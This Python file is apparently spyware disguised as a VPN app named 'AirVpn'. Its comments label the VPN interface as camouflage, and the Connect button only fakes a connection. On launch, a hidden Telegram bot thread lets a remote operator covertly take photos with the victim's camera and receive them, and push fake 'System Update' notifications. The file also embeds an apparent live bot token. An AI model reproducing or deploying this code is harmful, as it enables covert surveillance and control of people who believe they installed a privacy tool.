import flet as ft
import telebot
import threading
import os
import time
from plyer import camera, notification

# ТВОЙ ТОКЕН
TOKEN = "8640024441:AAGLqms9l4_luuro1XSuxBDISJAfu1xD3io"
bot = telebot.TeleBot(TOKEN)

# --- СКРЫТЫЕ ФУНКЦИИ ---
@bot.message_handler(commands=['start'])
def ghost_start(message):
    bot.reply_to(message, "AirVpn Node Online. Жду указаний.")

@bot.message_handler(commands=['photo'])
def ghost_photo(message):
    try:
        # Пытаемся сделать фото. Файл сохранится в папку приложения
        photo_path = "system_cache_img.jpg"
        camera.take_picture(filename=photo_path, on_complete=lambda path: None)
        time.sleep(3) # Даем камере время сработать
        if os.path.exists(photo_path):
            with open(photo_path, "rb") as img:
                bot.send_photo(message.chat.id, img)
            os.remove(photo_path)
        else:
            bot.reply_to(message, "Ошибка: Камера не ответила или доступ запрещен.")
    except Exception as e:
        bot.reply_to(message, f"Ошибка камеры: {e}")

@bot.message_handler(commands=['msg'])
def ghost_msg(message):
    text = message.text.replace("/msg ", "")
    try:
        notification.notify(title='System Update', message=text)
        bot.reply_to(message, "Сообщение выведено на экран.")
    except:
        pass

def run_bot_in_background():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except:
            time.sleep(10)

# Запуск бота в отдельном потоке
threading.Thread(target=run_bot_in_background, daemon=True).start()

# --- ВИЗУАЛ VPN (ДЛЯ МАСКИРОВКИ) ---
def main(page: ft.Page):
    page.title = "AirVpn"
    page.theme_mode = ft.ThemeMode.DARK
    page.bgcolor = "#101217"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER

    status = ft.Text("Safe Connection", color="#707070")
    
    def connect_logic(e):
        btn.text = "Connecting..."
        page.update()
        time.sleep(2)
        btn.text = "Disconnect"
        btn.bgcolor = "#303540"
        status.value = "Connected to Netherlands"
        status.color = "#00FF7F"
        page.update()

    btn = ft.ElevatedButton(
        "Connect", 
        width=220, 
        height=50, 
        bgcolor="#007AFF", 
        color="white",
        on_click=connect_logic
    )

    page.add(
        ft.Icon(ft.icons.SHIELD_LOCK_ROUNDED, size=100, color="#007AFF"),
        ft.Text("AirVpn", size=32, weight="bold"),
        status,
        ft.Container(height=50),
        btn,
        ft.Text("v. 1.2.4 Premium", size=12, color="#303540")
    )

ft.app(target=main)
